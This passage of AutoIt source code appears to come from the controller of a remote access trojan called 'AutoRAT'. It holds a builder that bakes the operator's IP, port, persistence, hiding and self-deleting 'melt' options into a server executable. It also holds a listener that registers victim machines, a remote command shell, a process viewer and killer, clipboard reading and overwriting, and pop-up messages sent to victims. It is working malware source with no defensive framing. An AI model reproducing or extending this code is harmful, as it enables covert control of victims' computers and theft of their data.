		$EIP = InputBox("Enter IP/DNS Adress", "Please enter your DNS/IP Adress", "127.0.0.1")
		If $EIP = "" Or @error Then ContinueLoop
		$EPORT = InputBox("Enter Port", "Please enter the connection Port for:" & @CRLF & @CRLF & $EIP, "81")
		If $EPORT = "" Or @error Then ContinueLoop
		$EINDEX = _GUICtrlListView_AddItem($ListView2, $EIP)
		_GUICtrlListView_SetItem($ListView2, $EPORT, $EINDEX, 1)

	Case $Button4 ; ----> DELETE
		If _GUICtrlListView_GetItemCount($ListView2) = 0 Then ContinueLoop
		If _GUICtrlListView_GetItemSelected($ListView2, 0) = False Then ContinueLoop
		_GUICtrlListView_DeleteItem(GUICtrlGetHandle($ListView2), 0)

	Case $Button5 ; -----------> BUILD THE SERVER
		If _GUICtrlListView_GetItemCount($ListView2) = 0 Then
			MsgBox(16, "Error", "Please add a IP/DNS.")
			ContinueLoop
		EndIf

		; =================== WRITE SETTINGS.ini =======================

	IniWrite ("settings.ini", "SERVER SETTINGS", "DNSIP", _GUICtrlListView_GetItemText($ListView2, 0, 0))
	IniWrite ("settings.ini", "SERVER SETTINGS", "PORT", _GUICtrlListView_GetItemText($ListView2, 0, 1))
	IniWrite ("settings.ini", "SERVER SETTINGS", "MUTEX", GUICtrlRead($Input5))
	IniWrite ("settings.ini", "SERVER SETTINGS", "SERVERPW", GUICtrlRead($Input6))


	if GUICtrlRead ($Checkbox4) = 4 then
	IniWrite ("settings.ini", "SERVER SETTINGS", "AUTOSTART", "0")
	Else
	IniWrite ("settings.ini", "SERVER SETTINGS", "AUTOSTART",GUICtrlRead ($Checkbox4))
	EndIf

	if GUICtrlRead ($Checkbox6) = 4 then
	IniWrite ("settings.ini", "SERVER SETTINGS", "HIDDEN", "0")
	Else
	IniWrite ("settings.ini", "SERVER SETTINGS", "HIDDEN",GUICtrlRead ($Checkbox6))
	EndIf

	if GUICtrlRead ($Checkbox7) = 4 then
	IniWrite ("settings.ini", "SERVER SETTINGS", "PERSISTANT", "0")
	Else
	IniWrite ("settings.ini", "SERVER SETTINGS", "PERSISTANT",GUICtrlRead ($Checkbox7))
	EndIf

	if GUICtrlRead ($Checkbox8) = 4 then
	IniWrite ("settings.ini", "SERVER SETTINGS", "MELT", "0")
	Else
	IniWrite ("settings.ini", "SERVER SETTINGS", "MELT",GUICtrlRead ($Checkbox8))
	EndIf

	if GUICtrlRead ($Checkbox9) = 4 then
	IniWrite ("settings.ini", "SERVER SETTINGS", "VISIBLE", "0")
	Else
	IniWrite ("settings.ini", "SERVER SETTINGS", "VISIBLE",GUICtrlRead ($Checkbox9))
	EndIf

	if GUICtrlRead ($Checkbox5) = 4 then
	IniWrite ("settings.ini", "SERVER SETTINGS", "INSTALL", "0")
	Else
	IniWrite ("settings.ini", "SERVER SETTINGS", "INSTALL",GUICtrlRead ($Checkbox5))
	EndIf
	IniWrite ("settings.ini", "SERVER SETTINGS", "FILENAME", GUICtrlRead($Input3))
	IniWrite ("settings.ini", "SERVER SETTINGS", "FOLDERNAME", GUICtrlRead($Input4))
	IniWrite ("settings.ini", "SERVER SETTINGS", "INSTALLPATH", GUICtrlRead($Combo1))
	DirCreate(@TempDir & "\AutoRAT")
	FileDelete(@TempDir & "\AutoRAT\server.exe")
	FileInstall("server.exe", @TempDir & "\AutoRAT\server.exe", 1)
	$serverhandle = FileOpen(@TempDir & "\AutoRAT\server.exe", 1)
	FileWriteLine ($serverhandle, "")
	FileWriteLine($serverhandle, "STARTEOF")
	FileWriteLine($serverhandle, "DNSIP=" & _GUICtrlListView_GetItemText($ListView2, 0))
	FileWriteLine($serverhandle, "PORT=" & _GUICtrlListView_GetItemText($ListView2, 0, 1))
	FileWriteLine($serverhandle, "Autostart=" & GUICtrlRead($Checkbox4))
	FileWriteLine($serverhandle, "Install=" & GUICtrlRead($Checkbox5))
	FileWriteLine($serverhandle, "MELT=" & GUICtrlRead($Checkbox8))
	FileWriteLine($serverhandle, "Hidden=" & GUICtrlRead($Checkbox6))
	FileWriteLine($serverhandle, "PASSWORD=" & GUICtrlRead($Input6))
	FileWriteLine($serverhandle, "MUTEX=" & GUICtrlRead($Input5))
	FileWriteLine($serverhandle, "PERSISTANT=" & GUICtrlRead($Checkbox7))
	FileWriteLine($serverhandle, "VISIBLE=" & GUICtrlRead($Checkbox9))
	FileWriteLine($serverhandle, "FILENAME=" & GUICtrlRead($Input3))
	FileWriteLine($serverhandle, "FOLDER=" & GUICtrlRead($Input4))
	FileWriteLine($serverhandle, "PATH=" & GUICtrlRead($Combo1))
	FileWrite($serverhandle, @CRLF&"ENDEOF")
	FileClose($serverhandle)
	FileDelete(@ScriptDir & "\server.exe")
	$copypath = FileSaveDialog ("Save File", @ScriptDir, "PE File (*.exe)","","server")
	if @error = 1 then ContinueLoop
	$stringinstrpath = StringInStr($copypath,".exe")
	If $stringinstrpath=0 Then $copypath = ($copypath & ".exe")
	FileCopy(@TempDir & "\AutoRAT\server.exe", $copypath, 1)
	FileDelete(@TempDir & "\AutoRAT\server.exe")
	MsgBox(64, "Success", "The Server was succsessfully created.")




; ============================================== END BUILD SERVER =============================



	Case $getping
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf

		$index = _GUICtrlListView_GetSelectedIndices ($ListView1, true)

		_GUICtrlListView_SetItem($ListView1, "Pinging...", $index[1], 5)
		$pingip= Ping(_GUICtrlListView_GetItemText($ListView1, $index[1], 2),300)
		If $pingip Then ;If error=0
			$ipping=$pingip
		Else
			$ipping="N.A."
		EndIf
		_GUICtrlListView_SetItem($ListView1, $ipping, $index[1], 5)

	Case $remoteshell
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
			ContinueLoop
		EndIf

		$cmdvar = UBound($cmdinput)
		ReDim $cmdinput[$cmdvar + 1]
		$cmdinput[0] = $cmdvar


		_makeremoteshellgui ()


	Case $clipboardmanager
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
		ContinueLoop
		EndIf

		$cc = UBound($clipapply)
		ReDim $clipapply[$cc + 1]
		$clipapply[0] = $cc

		_makepclipboardgui ()

	Case $msgboxcontext
		If _GUICtrlListView_GetSelectedCount($ListView1) = 0 Then
		ContinueLoop
		EndIf

		$pp = UBound($msgtest)
		ReDim $msgtest[$pp + 1]
		$msgtest[0] = $pp

		$tt = UBound($msgsend)
		ReDim $msgsend[$tt + 1]
		$msgsend[0] = $tt

		_makemsgui()






	Case Else
		if ($cmdinput[0]) Then
			for $cmdvar = 1 to $cmdinput[0]
				if ($nMsg[0] == $cmdinput[$cmdvar]) Then
					$title = WinGetTitle ($nMsg[1])
					Sleep(50)
					If ControlGetText($title, "", "[CLASS:Edit; INSTANCE:2]") = "" Then ContinueLoop
					If WinActive ($title) = 0 Then ContinueLoop
					$cmdgettext = ControlGetText($title, "", "[CLASS:Edit; INSTANCE:2]")
					_GUICtrlEdit_SetSel (ControlGetHandle($title,"","[CLASS:Edit; INSTANCE:2]"),0,StringLen(ControlGetText($title,"","[CLASS:Edit; INSTANCE:2]")))
					_GUICtrlEdit_AppendText (ControlGetHandle ($title, "", "[CLASS:Edit; INSTANCE:1]")," ")
					$buffer = ControlGetText ($title, "", "[CLASS:Edit; INSTANCE:1]") & $cmdgettext
					ControlSetText($title, "", "[CLASS:Edit; INSTANCE:1]", $buffer)
					_GUICtrlEdit_ReplaceSel(ControlGetHandle($title,"","[CLASS:Edit; INSTANCE:2]"),"")
					$socket = StringInStr ($title, "SOCKET:")
					$newsocket = StringTrimLeft ($title, $socket +6)
					TCPSend ($newsocket, "SETCMD="& $cmdgettext)
					For $i = 1 To 3072 Step 0.5
						$cmdreturn = TCPRecv ($newsocket, 3072)
						Sleep (150)
						if $cmdreturn <> "" and StringLeft ($cmdreturn,10) = "RETURNCMD=" Then ExitLoop
					Next
					$cmdreturn = StringTrimLeft ($cmdreturn, 10 + StringLen($cmdgettext))
					$buffer = $buffer & $cmdreturn
					ControlSetText($title, "", "[CLASS:Edit; INSTANCE:1]", $buffer)
					_GUICtrlEdit_AppendText (ControlGetHandle ($title, "", "[CLASS:Edit; INSTANCE:1]"), " ")
				EndIf
			Next
		EndIf

            If ($refreshprocesses[0]) Then
                For $z = 1 To $refreshprocesses[0]
					If ($nMsg[0] == $refreshprocesses[$z]) Then
						_refreshprocess ()
					EndIf
				Next
			EndIf

			If	($closeprocess[0]) Then
				For $zz = 1 To $closeprocess[0]
				If ($nMsg[0] == $closeprocess[$zz]) Then
					_closeproces ()
				EndIf
			Next
			EndIf

			If	($processpath[0]) Then
				For $yy = 1 To $processpath[0]
				If ($nMsg[0] == $processpath[$yy]) Then
					_getprocesspath ()
				EndIf
				Next
			EndIf

			If	($msgsend[0]) Then
				For $tt = 1 To $msgsend[0]
				If ($nMsg[0] == $msgsend[$tt]) Then
				_msgsend()
			EndIf
				Next
			EndIf

			if ($clipapply[0]) Then
				for $cc = 1 to $clipapply[0]
					if ($nMsg[0] == $clipapply[$cc]) Then
						_receivesend ()
					EndIf
				Next
			EndIf

						if ($msgtest[0]) Then
				for $pp = 1 to $msgtest[0]
					if ($nMsg[0] == $msgtest[$pp]) Then
						_testmsg ()
					EndIf
				Next
			EndIf



EndSwitch



; ========================================================== W8 for connections =========================================

$timer = $timer + 1
if $timer = 3 Then
$timer = 0

	If $mainsocket = -1 Or $mainsocket = "" Then
		_GUICtrlListView_DeleteAllItems(GUICtrlGetHandle($ListView1))
		ContinueLoop
	EndIf



	If _GUICtrlListView_GetItemCount($ListView1) > 0 Then
		If $l > _GUICtrlListView_GetItemCount($ListView1) - 1 Then $l = 0
		TCPRecv(_GUICtrlListView_GetItemText($ListView1, $l, 4), 1)
		If @error And _GUICtrlListView_GetItemText($ListView1, $l, 4) > 0 Then
			If GUICtrlRead($Checkbox2) = 1 Then
		$notifydisconnectwindow = GUICreate("Notifydisconnect", 446, 58, @DesktopWidth-446,@DesktopHeight-(58+$taskbar_pos), BitOR ($WS_POPUP,$WS_POPUPWINDOW))
		GUISetBkColor(0x000000)
		$disconnectlabel2 = GUICtrlCreateLabel("Connection Lost:", 0, 8, 444, 20, $SS_CENTER)
		GUICtrlSetFont(-1, 10, 800, 4, "Courier New")
		GUICtrlSetColor(-1, 0xFF0000)
		$disconnectlabel1 = GUICtrlCreateLabel("The User "&_GUICtrlListView_GetItemText($ListView1, $l, 0)&" has been disconnected", 0, 32, 444, 20, $SS_CENTER)
		GUICtrlSetFont(-1, 10, 400, 0, "Courier New")
		GUICtrlSetColor(-1, 0x008000)
		DllCall("user32.dll", "int", "AnimateWindow", "hwnd", $notifydisconnectwindow, "int", 500, "long", 0x00040008);slide-in from bottom
		GUISetState(@SW_SHOW)
		$time2 = TimerInit()
		$timerinit2 = 1
		EndIf

			If GUICtrlRead($Checkbox3) = 1 Then SoundPlay (@TempDir & "\AutoRAT\userleft.wav", 0)
			$connections[$l] = ""
; ============ CONNECTION LOST =================

; KILL FORMS ^^

$winarray = WinList ()

for $i = 1 to $winarray[0][0]
if StringInStr ($winarray[$i][0], "SOCKET:"&_GUICtrlListView_GetItemText($ListView1, $l, 4)) > 0 Then
GUIDelete ($winarray[$i][1])
EndIf
Next

; =============================================


			_GUICtrlListView_DeleteItem(GUICtrlGetHandle($ListView1), $l)




			WinSetTitle($winhandle, "", $version&"             " & _GUICtrlListView_GetItemCount($ListView1) & " Users are connected")
			$l = 0
		EndIf
		$l = $l + 1
	EndIf


	$tempconnection = TCPAccept($mainsocket)
	If $tempconnection = -1 Then ContinueLoop


	; TEEEST

					For $k = 0 To UBound($connections) - 1
				$connections[$k] = ""
			Next

	; TEEEEEEEEEEEEESt

	$index = _ArraySearch($connections, $tempconnection)
	If @error Then
		For $j = 0 To UBound($connections) - 1
			If $connections[$j] = "" Then
				$connections[$j] = $tempconnection
				$string = TCPRecv($connections[$j], 2048)
				If $string = "" Then ContinueLoop
				$pos1 = StringInStr($string, "IP=")
				$PW = StringLeft($string, $pos1 - 1) ; PW = XXXX
				$string2 = StringTrimLeft($string, StringLen($PW))
				$pos2 = StringInStr($string2, "USERNAME=")
				$IP = StringLeft($string2, $pos2 - 1) ; IP= XXXX
				$string3 = StringTrimLeft($string2, StringLen($IP))
				$pos3 = StringInStr($string3, "COMPUTER=")
				$USERNAME = StringLeft($string3, $pos3 - 1) ; COMPUTER = XXX
				$string4 = StringTrimLeft($string3, StringLen($USERNAME))
				$pos4 = StringInStr($string4, "OS=")
				$COMPUTER = StringLeft($string4, $pos4 - 1)
				$OS = StringTrimLeft($string4, StringLen($COMPUTER))
				If StringTrimLeft($PW, 3) <> GUICtrlRead($Input2) Then
					TCPCloseSocket($connections[$j])
					$connections[$j] = ""
					ContinueLoop 2
				EndIf

				$pingip= Ping(SocketToIP($tempconnection),300)
				If $pingip Then ;If error=0
					$ipping=$pingip
				Else
					$ipping="N.A."
				EndIf
				$index = _GUICtrlListView_AddItem($ListView1, StringTrimLeft($USERNAME, 9))
				_GUICtrlListView_SetItem($ListView1, StringTrimLeft($COMPUTER, 9), $index, 1)
				_GUICtrlListView_SetItem($ListView1, SocketToIP($tempconnection), $index, 2)
				WinSetTitle($winhandle, "", $version&"             " & _GUICtrlListView_GetItemCount($ListView1) & " Users are connected")
				_GUICtrlListView_SetItem($ListView1, StringTrimLeft($OS, 3), $index, 3)
				_GUICtrlListView_SetItem($ListView1, $connections[$j], $index, 4)
				_GUICtrlListView_SetItem($ListView1, $ipping, $index, 5)

				; TEST

				For $k = 0 To UBound($connections) - 1
				$connections[$k] = ""
				Next

				If GUICtrlRead($Checkbox1) = 1 Then

				$Notify = GUICreate("Notify", 302, 149, @DesktopWidth-302,@DesktopHeight-(149+$taskbar_pos), $WS_POPUP)
				GUISetBkColor(0x000000)
				WinSetOnTop($Notify,"",1)
				$Label1 = GUICtrlCreateLabel("Name:  "&_GUICtrlListView_GetItemText($ListView1, $index, 0), 8, 32, 286, 17)
				GUICtrlSetFont(-1, 9, 400, 0, "Courier New")
				GUICtrlSetColor(-1, 0x008000)
				$Label2 = GUICtrlCreateLabel("New Connection:", 8, 8, 124, 20)
				GUICtrlSetFont(-1, 10, 800, 4, "Courier New")
				GUICtrlSetColor(-1, 0xFF0000)
				$Label3 = GUICtrlCreateLabel("Computername:  "&_GUICtrlListView_GetItemText($ListView1, $index, 1), 8, 80, 278, 19)
				GUICtrlSetFont(-1, 9, 400, 0, "Courier New")
				GUICtrlSetColor(-1, 0x008000)
				$Label4 = GUICtrlCreateLabel("IP:  "& _GUICtrlListView_GetItemText($ListView1, $index, 2), 8, 56, 284, 17)
				GUICtrlSetFont(-1, 9, 400, 0, "Courier New")
				GUICtrlSetColor(-1, 0x008000)
				$Label5 = GUICtrlCreateLabel("Operating System:  "&_GUICtrlListView_GetItemText($ListView1, $index, 3), 8, 104, 284, 17)
				GUICtrlSetFont(-1, 9, 400, 0, "Courier New")
				GUICtrlSetColor(-1, 0x008000)
				$Label6 = GUICtrlCreateLabel("Ping:  "&_GUICtrlListView_GetItemText($ListView1, $index, 5), 9, 128, 284, 17)
				GUICtrlSetFont(-1, 9, 400, 0, "Courier New")
				GUICtrlSetColor(-1, 0x008000)
				DllCall("user32.dll", "int", "AnimateWindow", "hwnd", $Notify, "int", 500, "long", 0x00040008);slide-in from bottom
				GUISetState(@SW_SHOW)
				$time = TimerInit ()
				$timerinit = 1





				EndIf

				If GUICtrlRead($Checkbox3) = 1 Then SoundPlay (@TempDir & "\AutoRAT\userjoined.wav", 0)
				$connections[$index] = $tempconnection
				ExitLoop
			EndIf
		Next
	EndIf
EndIf

; ============================================================== END w8 FOR CONNECTIONS ========================================


WEnd

; ================================================== END MSG MODE ==================================================


; ================================================== FUNCTIONS ========================

Func SHOW() ; SHOWS THE GUI AFTER SHOW IN TRAY
	GUISetState(@SW_SHOW, $Form1)
	GUISetState(@SW_RESTORE, $Form1)
	TrayItemDelete($tray)
	TrayItemDelete($tray2)
	TrayItemDelete($tray3)
EndFunc   ;==>SHOW

Func CLOSE()
	Exit
EndFunc   ;==>CLOSE

Func SocketToIP($SHOCKET)
	Local $sockaddr, $aRet

	$sockaddr = DllStructCreate("short;ushort;uint;char[8]")

	$aRet = DllCall("Ws2_32.dll", "int", "getpeername", "int", $SHOCKET, _
			"ptr", DllStructGetPtr($sockaddr), "int*", DllStructGetSize($sockaddr))
	If Not @error And $aRet[0] = 0 Then
		$aRet = DllCall("Ws2_32.dll", "str", "inet_ntoa", "int", DllStructGetData($sockaddr, 3))
		If Not @error Then $aRet = $aRet[0]
	Else
		$aRet = 0
	EndIf

	$sockaddr = 0

	Return $aRet
EndFunc   ;==>SocketToIP

Func endscript()
TCPShutdown ()
DirRemove (@TempDir & "\AutoRAT")
Exit
EndFunc

Func _makeprocessgui()
		$dummy = _GUICtrlListView_GetSelectedIndices ($ListView1, true)
		if WinExists ("Processes "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4)) = 1 Then
			Return 0
		EndIf
		$processwindow = GUICreate("Processes "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4), 610, 400, -1, -1)
		$processcontextmenu = GUICtrlCreateContextMenu()
		GUICtrlSetCursor (-1, 0)
		$processstatus = _GUICtrlStatusBar_Create($processwindow)
		GUICtrlSetCursor (-1, 0)
		$processlistview = GUICtrlCreateListView("Process|PID|Path", 0, 0, 610, 380, -1, $LVS_EX_GRIDLINES)
;~ 		$processlistview = GUICtrlCreateListView("Process|PID|Path", 0, 0, 610, 380, -1, BitOR($WS_EX_CLIENTEDGE,$LVS_EX_GRIDLINES))
		GUICtrlSetImage (-1, @TempDir&"\AutoRAT\process.ico")
		GUICtrlSetCursor (-1, 0); mach die table nochn pixle breiter
		GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 0, 150)
		GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 1, 50)
		GUICtrlSendMsg(-1, $LVM_SETCOLUMNWIDTH, 2, 375)
		$processcontext = GUICtrlCreateContextMenu($processlistview)
		$refreshprocesses[$z] = GUICtrlCreateMenuItem("Refresh", $processcontext)
		$closeprocess[$zz] = GUICtrlCreateMenuItem("Close Process", $processcontext)
		$processpath[$yy] = GUICtrlCreateMenuItem("Get Processpath", $processcontext)
		GUISetState(@SW_SHOW)
EndFunc

Func _refreshprocess ()
					$pos55 = StringInStr (WinGetTitle($nMsg[1]), "SOCKET:")
					$socket =StringTrimLeft (WinGetTitle($nMsg[1]),$pos55+6)
					$processlistviewhandle = ControlGetHandle(WinGetTitle($nMsg[1]), "", "[CLASS:SysListView32; INSTANCE:1]")
					$processstatusbar = ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:msctls_statusbar32; INSTANCE:1]")
					_GUICtrlListView_DeleteAllItems ($processlistviewhandle)
					_GUICtrlStatusBar_SetText ($processstatusbar, "Please wait...")
					TCPSend ($socket, "GETPROCESSES")
					while 1
					$test = TCPRecv ($socket, 2048)
					if @error then
					ExitLoop
					GUIDelete ($nMsg[1])
					EndIf
					if $test = "" Then
					ContinueLoop
					Else
					ExitLoop
					EndIf
					WEnd
					$processarray = StringSplit ($test, "//", 1)

					Global $procs[UBound($processarray)]
					Global $pids[UBound($processarray)]

					For $k = 0 to $processarray[0]
					$procs[$k] = StringLeft($processarray[$k],StringInStr($processarray[$k],"\\")-1)
					$pids[$k] = StringTrimLeft($processarray[$k],StringInStr($processarray[$k],"\\")+1)
					Next

					$procs[0] = UBound($procs)
					$pids[0] = UBound ($pids)

					for $i = 1 to $procs[0] - 2
					$aktuellerindex = _GUICtrlListView_AddItem ($processlistviewhandle,$procs[$i])
					_GUICtrlListView_SetItem ($processlistviewhandle, $pids[$i], $aktuellerindex, 1)
					Next

					_GUICtrlStatusBar_SetText ($processstatusbar, "Processes succsessfully loaded.")
EndFunc

Func _closeproces()
$pos55 = StringInStr (WinGetTitle($nMsg[1]), "SOCKET:")
$socket = StringTrimLeft (WinGetTitle($nMsg[1]),$pos55+6)
$processlistviewhandle = ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:SysListView32; INSTANCE:1]")
$processstatusbar = ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:msctls_statusbar32; INSTANCE:1]")
	If _GUICtrlListView_GetSelectedCount($processlistviewhandle) = 0 Then
		Return 0
	EndIf
$dummy = _GUICtrlListView_GetSelectedIndices($processlistviewhandle, true)
TCPSend ($socket, "CLOSEPROCESS="&_GUICtrlListView_GetItemText($processlistviewhandle, $dummy[1]))
_GUICtrlStatusBar_SetText ($processstatusbar, "Processes "&_GUICtrlListView_GetItemText($processlistviewhandle, $dummy[1])&" succsessfully closed.")
_refreshprocess ()
EndFunc

Func _getprocesspath()
				$pos55 = StringInStr (WinGetTitle($nMsg[1]), "SOCKET:")
				$socket = StringTrimLeft (WinGetTitle($nMsg[1]),$pos55+6)
				$processlistviewhandle = ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:SysListView32; INSTANCE:1]")
				$processstatusbar = ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:msctls_statusbar32; INSTANCE:1]")
				If _GUICtrlListView_GetSelectedCount($processlistviewhandle) = 0 Then
				Return 0
				EndIf
				$dummy = _GUICtrlListView_GetSelectedIndices($processlistviewhandle, true)
				_GUICtrlStatusBar_SetText ($processstatusbar, "Please wait...")
					TCPSend ($socket, "GETPROCESSPATH="&_GUICtrlListView_GetItemText($processlistviewhandle,$dummy[1]))
					while 1
					$test = TCPRecv ($socket, 1024)
					if @error then
					ExitLoop
					GUIDelete ($nMsg[1])
					EndIf
					if $test = "" Then
					ContinueLoop
					Else
					ExitLoop
					EndIf
				WEnd
				if $test = -1 Then
				$test = "Process not found"
				EndIf
				_GUICtrlListView_SetItemText ($processlistviewhandle, $dummy[1], $test, 2)
				_GUICtrlStatusBar_SetText ($processstatusbar, "Processpath succsessfully received.")
EndFunc

Func _makepclipboardgui ()
		$dummy = _GUICtrlListView_GetSelectedIndices ($ListView1, true)
		if WinExists ("Clipboard "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4)) = 1 Then
			Return 0
		EndIf

$clipboardwindow = GUICreate("Clipboard "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4), 525, 266, -1, -1, BitOR($WS_MINIMIZEBOX,$WS_SIZEBOX,$WS_THICKFRAME,$WS_SYSMENU,$WS_CAPTION,$WS_POPUP,$WS_POPUPWINDOW,$WS_GROUP,$WS_BORDER,$WS_CLIPSIBLINGS))
GUISetCursor (0)
$Clipedit = GUICtrlCreateEdit("", 8, 8, 297, 233, BitOR($ES_NOHIDESEL,$ES_WANTRETURN,$WS_HSCROLL,$WS_VSCROLL,$WS_BORDER), BitOR($WS_EX_CLIENTEDGE,$WS_EX_STATICEDGE))
GUICtrlSetData(-1, "")
GUICtrlSetFont(-1, 10, 400, 0, "Courier New")
GUICtrlSetColor(-1, 0x008000)
GUICtrlSetBkColor(-1, 0x000000)
GUICtrlSetCursor (-1, 0)
$StatusBarclipboard = _GUICtrlStatusBar_Create($clipboardwindow)
$Group1 = GUICtrlCreateGroup("Options", 320, 8, 193, 233)
$Cliplistoptions = GUICtrlCreateList("Get Clipboard Text", 352, 56, 129, 32)
GUICtrlSetData (-1, "Set Clipboard Text")
GUICtrlSetCursor (-1, 0)
$clipapply[$cc] = GUICtrlCreateButton("Receive/Send", 336, 200, 163, 25, $WS_GROUP)
GUICtrlSetCursor (-1, 0)
$cliplistbytes = GUICtrlCreateList("512 Bytes", 352, 128, 129, 58, $WS_BORDER)
GUICtrlSetData(-1, "1024 Bytes|2048 Bytes|4096 Bytes")
GUICtrlSetCursor (-1, 0)
$Label1 = GUICtrlCreateLabel("Bytes to receive and send:", 336, 104, 156, 17, $SS_CENTER)
GUICtrlSetFont(-1, 8, 800, 4, "MS Sans Serif")
$Label2 = GUICtrlCreateLabel("Set or get Clipboard:", 336, 32, 157, 17, $SS_CENTER)
GUICtrlSetFont(-1, 8, 800, 4, "MS Sans Serif")
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)

EndFunc

Func _receivesend ()
$pos55 = StringInStr (WinGetTitle($nMsg[1]), "SOCKET:")
$socket =StringTrimLeft (WinGetTitle($nMsg[1]),$pos55+6)

_GUICtrlStatusBar_SetText (ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:msctls_statusbar32; INSTANCE:1]"), "Please wait...")


if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:1]")) = 0 Then

if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 0 Then $bytes = 512
if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 1 Then $bytes = 1024
if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 2 Then $bytes = 2048
if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 3 Then $bytes = 4096

	for $i = 1 to 10
	TCPSend ($socket, "GETCLIPBOARD")
	if @error Then
	GUIDelete ($nMsg[1])
	ExitLoop 2
	EndIf
	$test = TCPRecv ($socket, $bytes)
	sleep (1000)
	if $test = "" then ContinueLoop
	if $test <> "" Then ExitLoop
	Next
	$test = StringTrimLeft ($test, 10)
	ControlSetText (WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:1]", $test)
	_GUICtrlStatusBar_SetText (ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:msctls_statusbar32; INSTANCE:1]"), "Clipboard succsessfully received.")
	Return 0


Else

if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 0 Then $bytes = 512
if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 1 Then $bytes = 1024
if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 2 Then $bytes = 2048
if _GUICtrlListBox_GetCurSel(ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:ListBox; INSTANCE:2]")) = 3 Then $bytes = 4096

TCPSend ($socket, "SETBYTES="&$bytes)
sleep (1000)
	if @error Then
	GUIDelete ($nMsg[1])
	Return 0
EndIf
TCPSend ($socket, "SETCLIPBOARD="&ControlGetText (WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:1]"))
Sleep (1000)
	if @error then
	GUIDelete ($nMsg[1])
	Return 0
	EndIf

EndIf

_GUICtrlStatusBar_SetText (ControlGetHandle (WinGetTitle($nMsg[1]),"", "[CLASS:msctls_statusbar32; INSTANCE:1]"), "Clipboard succsessfully set.")
Return 0

EndFunc

Func _makemsgui ()
	$dummy = _GUICtrlListView_GetSelectedIndices ($ListView1, true)
	if WinExists ("Message "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4)) = 1 Then
	Return 0
	EndIf
$msgform = GUICreate("Message "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4), 485, 428, -1, -1)
GUISetCursor (0)
GUISetBkColor(0xC0C0C0)
$Group1 = GUICtrlCreateGroup("Icon Settings", 8, 8, 169, 385)
$Icon3 = GUICtrlCreateIcon(@TempDir&"\AutoRAT\Stop.ico", -1, 24, 40, 50, 50, BitOR($SS_NOTIFY,$WS_GROUP))
$Icon4 = GUICtrlCreateIcon(@TempDir&"\AutoRAT\Info.ico", -1, 24, 256, 50, 50, BitOR($SS_NOTIFY,$WS_GROUP))
$Icon1 = GUICtrlCreateIcon(@TempDir&"\AutoRAT\Questionmark.ico", -1, 24, 112, 50, 50, BitOR($SS_NOTIFY,$WS_GROUP))
$Icon2 = GUICtrlCreateIcon(@TempDir&"\AutoRAT\Warning.ico", -1, 24, 184, 50, 50, BitOR($SS_NOTIFY,$WS_GROUP))
$Icon5 = GUICtrlCreateIcon("", -1, 24, 328, 50, 50, BitOR($SS_NOTIFY,$WS_GROUP))
$errorradio = GUICtrlCreateRadio("Error", 88, 56, 73, 17)
GUICtrlSetCursor (-1, 0)
$questionradio = GUICtrlCreateRadio("Question", 88, 128, 73, 17)
GUICtrlSetCursor (-1, 0)
$exclamationradio = GUICtrlCreateRadio("Exclamation", 88, 200, 81, 17)
GUICtrlSetCursor (-1, 0)
$inforadio = GUICtrlCreateRadio("Info", 88, 272, 73, 17)
GUICtrlSetCursor (-1, 0)
$noneradio = GUICtrlCreateRadio("None", 88, 344, 65, 17)
GUICtrlSetCursor (-1, 0)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$msgstatusbar = _GUICtrlStatusBar_Create($msgform)
$Group2 = GUICtrlCreateGroup("Message Settings", 192, 8, 281, 385)
$Label1 = GUICtrlCreateLabel("Message Title: ", 208, 50, 76, 17)
GUICtrlSetFont(-1, 8, 400, 4, "MS Sans Serif")
$msgtitle = GUICtrlCreateInput("Hello", 304, 48, 145, 21)
GUICtrlSetCursor (-1, 0)
